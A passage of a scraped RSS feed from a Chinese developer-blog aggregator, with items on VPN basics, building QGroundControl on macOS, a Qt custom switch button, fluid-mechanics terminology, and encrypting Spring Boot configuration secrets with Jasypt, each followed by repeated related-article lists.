转列&amp;#xff1a;transition 涡脱落&amp;#xff1a;vortex shedding 涡分离&amp;#xff1a;vortex rupture 气动噪声&amp;#xff1a…阅读更多...SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)目录 
1.添加依赖 
2.接下来去生成密文 
3.然后在命令行窗口通过mvn命令去调用这个插件 
4.接下来会生成对对应的密文&amp;#xff0c;然后去替换application.properties中的对应内容 
5.运行程序解密 在软件开发中&amp;#xff0c;保护敏感信息如数据库密码、API密钥等是至关重要的。J…阅读更多...leaflet(一)初始化地图Leaflet 与天地图结合使用&amp;#xff0c;可以通过天地图提供的 API 获取地图瓦片&amp;#xff0c;并在 Leaflet 地图上显示。 
1. 安装依赖 
首先&amp;#xff0c;确保你已经安装了 Leaflet 和 Vue&amp;#xff1a; 
npm install leaflet
npm install vue-leaflet
npm install leaflet.tilela…阅读更多...【黑马Redis原理篇】Redis网络模型来源视频 [16,27]  文章目录 1.用户空间和内核空间空间划分缓冲区 2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式&amp;#xff0c;有多种实现 2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步 1.用户空间和内…阅读更多...开篇：SpringBoot与SpringCloud的那些事在正式开始研究 SpringCloud 的技术之前&amp;#xff0c;咱先简单的用比较短的篇幅聊一点概述性质的东西&amp;#xff0c;让思维活跃起来。 SpringCloud与SpringBoot的关系和对比 一开始学习 SpringCloud 咱就知道&amp;#xff0c;SpringCloud 的技术大多都不是自己造的&amp;#xff0c;都是整合…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:07 +0000</pubDate>
    </item>
    <item>
      <title>通信工程学习：什么是VPN虚拟私人网络</title>
      <link>https://www.ppmy.cn/news/1540365.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维通信工程学习：什么是VPN虚拟私人网络news/2025/10/31 17:53:06/VPN：虚拟私人网络VPN，即虚拟私人网络（Virtual Private Network），是一种通过公共网络（如互联网）建立的加密连接，用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细解释：一、VPN的定义与特点定义：VPN允许用户通过加密的通道连接到组织的内部网络，从而在公共网络上安全地访问内部资源，如服务器、数据库和应用程序。特点：安全性：通过加密通信，保护数据在传输过程中不被恶意用户窃取或篡改。隐私性：用户可以在公共网络上访问内部资源，而无需暴露自己的真实IP地址。跨地域访问：不同地理位置的用户可以通过一个安全的连接访问内部资源。易于管理：管理员可以集中管理VPN，而无需在每个远程用户的设备上单独配置。二、VPN的工作原理VPN的工作原理是通过使用加密和隧道技术，在公共网络上创建一个安全的通信通道。具体步骤如下：数据加密：将用户的数据进行加密处理，确保数据在传输过程中的机密性。封装隧道：将加密后的数据封装在安全的隧道中，该隧道通过公共网络传输。身份验证：进行身份验证，确保只有授权用户才能访问VPN网络。数据完整性检查：确保传输的数据在到达目的地时保持完整，未被篡改。三、VPN的类型VPN有多种类型，以满足不同场景下的需求，主要包括：1、远程访问VPN：允许用户在公共网络上安全地访问私有网络，如远程办公场景。2、点对点VPN：将不同地点的私有局域网（LAN）通过公共网络连接起来，创建一个安全的跨网络通信隧道。3、入口站点VPN：建立安全的通信隧道，允许远程办事处或分支机构与总部或主要站点之间连接。4、专线VPN：使用多协议标签交换（MPLS）技术，提供虚拟专用网络连接，适用于需要高带宽和可靠连接的企业。5、客户端对站点VPN：允许个人用户通过公共网络连接到特定的私人网络。四、VPN的使用场景VPN的应用场景非常广泛，包括但不限于：1、远程办公：员工可以通过VPN连接到公司的内部网络，实现远程办公。2、数据加密与隐私保护：在公共Wi-Fi等不安全网络环境下，VPN可以保护用户的隐私和数据安全。3、绕过地理限制：通过更改IP地址，访问特定地区限制的内容或服务。4、网络匿名性：隐藏用户的真实IP地址，增加网络匿名性。5、多地点连通：为企业和组织提供跨地区的内部通信和数据共享。6、公司外包和远程协作：为远程团队提供安全的网络访问权限，实现协同工作。五、VPN的注意事项尽管VPN在保护用户隐私和数据安全方面具有重要作用，但用户在使用时也需要注意以下事项：选择可信赖的VPN服务提供商，确保其具有良好的信誉和可靠的技术支持。遵守合法的使用规则，避免利用VPN从事违法活动。定期更新VPN客户端和服务器软件，以确保安全漏洞得到及时修复。综上所述，VPN是一种强大的网络安全工具，通过加密和隧道技术为用户在公共网络上提供安全的网络连接和数据传输服务。用户在使用时应根据实际需求选择合适的VPN类型和服务提供商，并遵守相关规定以确保安全使用。http://www.ppmy.cn/news/1540365.html相关文章QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)1.下载源码: 
git clone https://github.com/mavlink/qgroundcontrol.git --recursive 2.安装依赖： 
brew install GStreamer 设置环境变量：GST_PLUGIN_PATH 安装SDL2: 
brew install SDL2阅读更多...Qt 自绘开关按钮以及设计器中的提升为用法文章目录 自绘按钮实现概要效果图代码 提升为用法介绍步骤 总结 自绘按钮实现 
概要 
当我们需要一个开关样式的QPushbutton&amp;#xff0c;没有图片的话&amp;#xff0c;我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中&amp;#xff0c;而不是使用代码的…阅读更多...流体力学笔记目录 1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考&amp;#xff1a;[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513) 1、名词 
转列&amp;#xff1a;transition 涡脱落&amp;#xff1a;vortex shedding 涡分离&amp;#xff1a;vortex rupture 气动噪声&amp;#xff1a…阅读更多...SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)目录 
1.添加依赖 
2.接下来去生成密文 
3.然后在命令行窗口通过mvn命令去调用这个插件 
4.接下来会生成对对应的密文&amp;#xff0c;然后去替换application.properties中的对应内容 
5.运行程序解密 在软件开发中&amp;#xff0c;保护敏感信息如数据库密码、API密钥等是至关重要的。J…阅读更多...leaflet(一)初始化地图Leaflet 与天地图结合使用&amp;#xff0c;可以通过天地图提供的 API 获取地图瓦片&amp;#xff0c;并在 Leaflet 地图上显示。 
1. 安装依赖 
首先&amp;#xff0c;确保你已经安装了 Leaflet 和 Vue&amp;#xff1a; 
npm install leaflet
npm install vue-leaflet
npm install leaflet.tilela…阅读更多...【黑马Redis原理篇】Redis网络模型来源视频 [16,27]  文章目录 1.用户空间和内核空间空间划分缓冲区 2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式&amp;#xff0c;有多种实现 2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步 1.用户空间和内…阅读更多...开篇：SpringBoot与SpringCloud的那些事在正式开始研究 SpringCloud 的技术之前&amp;#xff0c;咱先简单的用比较短的篇幅聊一点概述性质的东西&amp;#xff0c;让思维活跃起来。 SpringCloud与SpringBoot的关系和对比 一开始学习 SpringCloud 咱就知道&amp;#xff0c;SpringCloud 的技术大多都不是自己造的&amp;#xff0c;都是整合…阅读更多...Vue快速创建工程+Element Plus创建Vue工程  执行命令 
npm init vuelatest 执行这两个绿色的命令 执行这个命令启动 
npm run dev Element 
打开网站https://element-plus.org/zh-CN/ npm install element-plus --save 然后在vscode中打开你的项目工程 // main.ts
import { createApp } from vue
import Ele…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:06 +0000</pubDate>
    </item>
    <item>
      <title>QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)</title>
      <link>https://www.ppmy.cn/news/1540364.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)news/2025/10/31 17:53:05/1.下载源码:git clone https://github.com/mavlink/qgroundcontrol.git --recursive2.安装依赖：brew install GStreamer设置环境变量：GST_PLUGIN_PATH安装SDL2:brew install SDL2http://www.ppmy.cn/news/1540364.html相关文章Qt 自绘开关按钮以及设计器中的提升为用法文章目录 自绘按钮实现概要效果图代码 提升为用法介绍步骤 总结 自绘按钮实现 
概要 
当我们需要一个开关样式的QPushbutton&amp;#xff0c;没有图片的话&amp;#xff0c;我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中&amp;#xff0c;而不是使用代码的…阅读更多...流体力学笔记目录 1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考&amp;#xff1a;[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513) 1、名词 
转列&amp;#xff1a;transition 涡脱落&amp;#xff1a;vortex shedding 涡分离&amp;#xff1a;vortex rupture 气动噪声&amp;#xff1a…阅读更多...SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)目录 
1.添加依赖 
2.接下来去生成密文 
3.然后在命令行窗口通过mvn命令去调用这个插件 
4.接下来会生成对对应的密文&amp;#xff0c;然后去替换application.properties中的对应内容 
5.运行程序解密 在软件开发中&amp;#xff0c;保护敏感信息如数据库密码、API密钥等是至关重要的。J…阅读更多...leaflet(一)初始化地图Leaflet 与天地图结合使用&amp;#xff0c;可以通过天地图提供的 API 获取地图瓦片&amp;#xff0c;并在 Leaflet 地图上显示。 
1. 安装依赖 
首先&amp;#xff0c;确保你已经安装了 Leaflet 和 Vue&amp;#xff1a; 
npm install leaflet
npm install vue-leaflet
npm install leaflet.tilela…阅读更多...【黑马Redis原理篇】Redis网络模型来源视频 [16,27]  文章目录 1.用户空间和内核空间空间划分缓冲区 2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式&amp;#xff0c;有多种实现 2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步 1.用户空间和内…阅读更多...开篇：SpringBoot与SpringCloud的那些事在正式开始研究 SpringCloud 的技术之前&amp;#xff0c;咱先简单的用比较短的篇幅聊一点概述性质的东西&amp;#xff0c;让思维活跃起来。 SpringCloud与SpringBoot的关系和对比 一开始学习 SpringCloud 咱就知道&amp;#xff0c;SpringCloud 的技术大多都不是自己造的&amp;#xff0c;都是整合…阅读更多...Vue快速创建工程+Element Plus创建Vue工程  执行命令 
npm init vuelatest 执行这两个绿色的命令 执行这个命令启动 
npm run dev Element 
打开网站https://element-plus.org/zh-CN/ npm install element-plus --save 然后在vscode中打开你的项目工程 // main.ts
import { createApp } from vue
import Ele…阅读更多...jQuery 中的 Ajax 详解一、概念 众所周知&amp;#xff0c;jQuery 是一个跨主流浏览器的 JavaScript 库&amp;#xff0c;它封装了 JavaScript 的常用功能代码&amp;#xff0c;简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject&amp;#xff08;IE9…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:05 +0000</pubDate>
    </item>
    <item>
      <title>Qt 自绘开关按钮以及设计器中的提升为用法</title>
      <link>https://www.ppmy.cn/news/1540363.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Qt 自绘开关按钮以及设计器中的提升为用法news/2025/10/31 17:53:04/文章目录自绘按钮实现概要效果图代码'提升为'用法介绍步骤总结自绘按钮实现概要当我们需要一个开关样式的QPushbutton，没有图片的话，我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中，而不是使用代码的方式。效果图代码代码相对简单，主要看一下绘制的实现voidSwitchButton::paintEvent(QPaintEvent*event){QPushButton::paintEvent(event);// 调用基类的绘制事件QPainterpainter(this);painter.setRenderHint(QPainter::Antialiasing);// 定义滚珠的半径qreal ballRadius=height()*0.4;// 可以根据需要调整滚珠大小qreal padding=(height()-ballRadius*2)/2;// 按钮内部边距// 绘制按钮的背景QRectFrect(padding,padding,width()-padding*2,height()-padding*2);painter.setPen(Qt::NoPen);if(m_isAutoMode){painter.setBrush(QColor(33,51,107));}else{painter.setBrush(QColor(25,127,224));}painter.drawRoundedRect(rect,ballRadius,ballRadius);// 使用滚珠半径作为圆角半径// 绘制圆形滚珠qreal ballPosition=m_isAutoMode?rect.width()-ballRadius*2:0;QRectFballRect(ballPosition+padding,padding,ballRadius*2,ballRadius*2);// 设置滚珠的渐变色qreal gradientCenterX=ballPosition+padding+ballRadius;qreal gradientCenterY=padding+ballRadius;QRadialGradientgradient(gradientCenterX,gradientCenterY,ballRadius);gradient.setColorAt(0,QColor(25,127,224));gradient.setColorAt(1,QColor(33,51,107));painter.setBrush(gradient);painter.drawEllipse(ballRect);// 绘制文本painter.setPen(Qt::white);QString text=m_isAutoMode?"自动模式":"手动模式";painter.drawText(rect,Qt::AlignCenter,text);}'提升为’用法介绍在Qt设计器中，它允许用户将一个标准Qt Widget转换为自定义的QWidget子类。这样，用户可以在设计器中使用自己的控件，同时还能在代码中添加额外的功能或属性。步骤随便拖入一个按钮到设计器中右键它，找到’提升为’选项填入已经实现的类，点击添加，添加完成后就可以选择提升总结知识理应共享，源码在此提升为用起来还是很方便的，可以大大减少代码量以及提高阅读效率http://www.ppmy.cn/news/1540363.html相关文章流体力学笔记目录 1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考&amp;#xff1a;[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513) 1、名词 
转列&amp;#xff1a;transition 涡脱落&amp;#xff1a;vortex shedding 涡分离&amp;#xff1a;vortex rupture 气动噪声&amp;#xff1a…阅读更多...SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)目录 
1.添加依赖 
2.接下来去生成密文 
3.然后在命令行窗口通过mvn命令去调用这个插件 
4.接下来会生成对对应的密文&amp;#xff0c;然后去替换application.properties中的对应内容 
5.运行程序解密 在软件开发中&amp;#xff0c;保护敏感信息如数据库密码、API密钥等是至关重要的。J…阅读更多...leaflet(一)初始化地图Leaflet 与天地图结合使用&amp;#xff0c;可以通过天地图提供的 API 获取地图瓦片&amp;#xff0c;并在 Leaflet 地图上显示。 
1. 安装依赖 
首先&amp;#xff0c;确保你已经安装了 Leaflet 和 Vue&amp;#xff1a; 
npm install leaflet
npm install vue-leaflet
npm install leaflet.tilela…阅读更多...【黑马Redis原理篇】Redis网络模型来源视频 [16,27]  文章目录 1.用户空间和内核空间空间划分缓冲区 2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式&amp;#xff0c;有多种实现 2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步 1.用户空间和内…阅读更多...开篇：SpringBoot与SpringCloud的那些事在正式开始研究 SpringCloud 的技术之前&amp;#xff0c;咱先简单的用比较短的篇幅聊一点概述性质的东西&amp;#xff0c;让思维活跃起来。 SpringCloud与SpringBoot的关系和对比 一开始学习 SpringCloud 咱就知道&amp;#xff0c;SpringCloud 的技术大多都不是自己造的&amp;#xff0c;都是整合…阅读更多...Vue快速创建工程+Element Plus创建Vue工程  执行命令 
npm init vuelatest 执行这两个绿色的命令 执行这个命令启动 
npm run dev Element 
打开网站https://element-plus.org/zh-CN/ npm install element-plus --save 然后在vscode中打开你的项目工程 // main.ts
import { createApp } from vue
import Ele…阅读更多...jQuery 中的 Ajax 详解一、概念 众所周知&amp;#xff0c;jQuery 是一个跨主流浏览器的 JavaScript 库&amp;#xff0c;它封装了 JavaScript 的常用功能代码&amp;#xff0c;简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject&amp;#xff08;IE9…阅读更多...Java 小游戏《超级马里奥》文章目录 一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口 一、效果展示 二、代码编写 
1. 素材准备 
首先创建一个基本的 java 项目&amp;#xff0c;并将本游戏需要用到的图片素材 image…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:04 +0000</pubDate>
    </item>
    <item>
      <title>流体力学笔记</title>
      <link>https://www.ppmy.cn/news/1540362.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维流体力学笔记news/2025/10/31 17:53:03/目录1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考：[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513)1、名词转列：transition涡脱落：vortex shedding涡分离：vortex rupture气动噪声： aerodynamic noise涡/湍流噪声 vortex noise/turbulent noise频谱分布特征：spectrum distribution characteristics能量谱密度：energy spectral density (ESD)功率谱密度：power spectral density(PSD)2、湍流与涡流湍流必然伴随着涡流，涡流不一定是湍流湍流产生机理：流体内部产生奇点（u=0），出现速度梯度，诱发了局部旋涡，导致了湍流的产生，速度梯度越大，越容易产生湍流。高雷诺数流体在流过固体表面时，会发生附面层（边界层：边界层过渡到主流区也存在速度梯度)的分离，从而产生漩涡。拓展“流体不经搓，一搓就产生了涡”。其实“搓”代表外部剪切，根据能量梯度理论，剪切是产生不了湍流漩涡的。搓出来的涡一般都是层流旋涡。只有流体内部奇点诱导的旋涡才是湍流旋涡。但是剪切可以提供奇点产生的条件（加速湍流产生），它不能直接产生湍流旋涡（也就是湍流旋涡的机理不是剪切）。层流旋涡产生后，一般需要对流一段距离，然后在旋涡内部产生奇点，再然后转捩成为湍流旋涡，圆柱绕流尾迹就是一个例子。------浙江理工大学窦华书3 涡激振动涡激振动（Vortex-Induced Vibration, VIV）是指流体（如气流或水流）绕过物体时产生的周期性涡流引起的振动现象。4 压力面与吸力面压力面是高压区，吸力面是高速低压区或负压区竖直方向上，上高下低形成下压力，上低下高形成升力，例如，在飞机的翼型上方存在着较快的流动速度，而下方则存在着较慢的流动速度。根据伯努利方程，我们可以得知上方的压力较低，而下方的压力较高。这种压力差会产生一个向上的力，即升力，从而使飞机得以飞行。而对于稳定行驶的汽车，则需要汽车受到下压力，因此，可以将机翼的吸力面置于下侧，压力面置于上侧。参考：空气动力学的“他山之石”http://www.ppmy.cn/news/1540362.html相关文章SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)目录 
1.添加依赖 
2.接下来去生成密文 
3.然后在命令行窗口通过mvn命令去调用这个插件 
4.接下来会生成对对应的密文&amp;#xff0c;然后去替换application.properties中的对应内容 
5.运行程序解密 在软件开发中&amp;#xff0c;保护敏感信息如数据库密码、API密钥等是至关重要的。J…阅读更多...leaflet(一)初始化地图Leaflet 与天地图结合使用&amp;#xff0c;可以通过天地图提供的 API 获取地图瓦片&amp;#xff0c;并在 Leaflet 地图上显示。 
1. 安装依赖 
首先&amp;#xff0c;确保你已经安装了 Leaflet 和 Vue&amp;#xff1a; 
npm install leaflet
npm install vue-leaflet
npm install leaflet.tilela…阅读更多...【黑马Redis原理篇】Redis网络模型来源视频 [16,27]  文章目录 1.用户空间和内核空间空间划分缓冲区 2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式&amp;#xff0c;有多种实现 2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步 1.用户空间和内…阅读更多...开篇：SpringBoot与SpringCloud的那些事在正式开始研究 SpringCloud 的技术之前&amp;#xff0c;咱先简单的用比较短的篇幅聊一点概述性质的东西&amp;#xff0c;让思维活跃起来。 SpringCloud与SpringBoot的关系和对比 一开始学习 SpringCloud 咱就知道&amp;#xff0c;SpringCloud 的技术大多都不是自己造的&amp;#xff0c;都是整合…阅读更多...Vue快速创建工程+Element Plus创建Vue工程  执行命令 
npm init vuelatest 执行这两个绿色的命令 执行这个命令启动 
npm run dev Element 
打开网站https://element-plus.org/zh-CN/ npm install element-plus --save 然后在vscode中打开你的项目工程 // main.ts
import { createApp } from vue
import Ele…阅读更多...jQuery 中的 Ajax 详解一、概念 众所周知&amp;#xff0c;jQuery 是一个跨主流浏览器的 JavaScript 库&amp;#xff0c;它封装了 JavaScript 的常用功能代码&amp;#xff0c;简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject&amp;#xff08;IE9…阅读更多...Java 小游戏《超级马里奥》文章目录 一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口 一、效果展示 二、代码编写 
1. 素材准备 
首先创建一个基本的 java 项目&amp;#xff0c;并将本游戏需要用到的图片素材 image…阅读更多...智能体网络时代即将来临，我们需要新的连接技术备注&amp;#xff1a;如果你也对这个话题感兴趣&amp;#xff0c;欢迎联系我们&amp;#xff1a; email: chgaoweigmail.com  Discord: https://discord.gg/CDYdTPXXMB  官网: https://pi-unlimited.com  
我们的方案代码已经开源&amp;#xff0c;github&amp;#xff1a;https://github.com/chgaowei/…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:03 +0000</pubDate>
    </item>
    <item>
      <title>SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)</title>
      <link>https://www.ppmy.cn/news/1540361.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维SpringBoot配置文件敏感信息如何加密？及踩坑总结(全面讲解)news/2025/10/31 17:53:02/目录1.添加依赖2.接下来去生成密文3.然后在命令行窗口通过mvn命令去调用这个插件4.接下来会生成对对应的密文，然后去替换application.properties中的对应内容5.运行程序解密在软件开发中，保护敏感信息如数据库密码、API密钥等是至关重要的。Jasypt（Java Simplified Encryption）提供了一种简单而有效的方式来加密和解密这些敏感数据。在Spring Boot应用中集成Jasypt，不仅可以提高安全性，还能保持代码的整洁和可维护性。以下为集成步骤：1.添加依赖&lt;!--配置密码加密--&gt;
&lt;dependency&gt;&lt;groupId&gt;com.github.ulisesbocchio&lt;/groupId&gt;&lt;artifactId&gt;jasypt-maven-plugin&lt;/artifactId&gt;&lt;version&gt;3.0.3&lt;/version&gt;
&lt;/dependency&gt;2.接下来去生成密文生成密文的方式有很多，可以通过代码实现，或者借助jasypt提供的一个工具，Maven的插件。这里采用比较方便的Maven插件，将以下信息复制到pom.xml文件内：&lt;/plugins&gt;&lt;plugin&gt;&lt;groupId&gt;com.github.ulisesbocchio&lt;/groupId&gt;&lt;artifactId&gt;jasypt-maven-plugin&lt;/artifactId&gt;&lt;version&gt;3.0.5&lt;/version&gt;&lt;/plugin&gt;
&lt;/plugins&gt;3.然后在命令行窗口通过mvn命令去调用这个插件mvn jasypt:encrypt-value "-Djasypt.encryptor.password=你的密钥" "-Djasypt.plugin.value=要加密的明文" "-Djasypt.encryptor.algorithm=PBEWithMD5AndDES"这里有两个点需要补充一下：3.1我看了网上的教程他们的命令基本是都是：mvn jasypt:encrypt-value -Djasypt.encryptor.password="你的密钥" -Djasypt.plugin.value="要加密的明文" -Djasypt.encryptor.algorithm="PBEWithMD5AndDES"如果使用这个命令的话会发生如下报错：[ERROR] Failed to execute goal com.github.ulisesbocchio:jasypt-maven-plugin:3.0.5:encrypt-value (default-cli) on project StudentM: No jasypt.plugin.value property provided -&gt; [Help 1]3.2如果未写："-Djasypt.encryptor.algorithm=PBEWithMD5AndDES"，则会发生报错：Error Encrypting: Encryption raised an exception. A possible cause is you are using strong encryption algorithms and you have not installed the Java Cryptography Extension (JCE) Unlimited Strength Jurisdiction Policy Files in this Java Virtual Machine -&gt; [Help 1]这是因为其默认的算法是：PBEWITHHMACSHA512ANDAES_256，但是这个算法需要有JCE(Java Cryptography Extension)的支持，如果不想安装JCE的话，就必须使用PBEWithMD5AndDES这个算法，这个算法是Windows下的JDK自带的。4.接下来会生成对对应的密文，然后去替换application.properties中的对应内容5.运行程序解密在Run/Debug 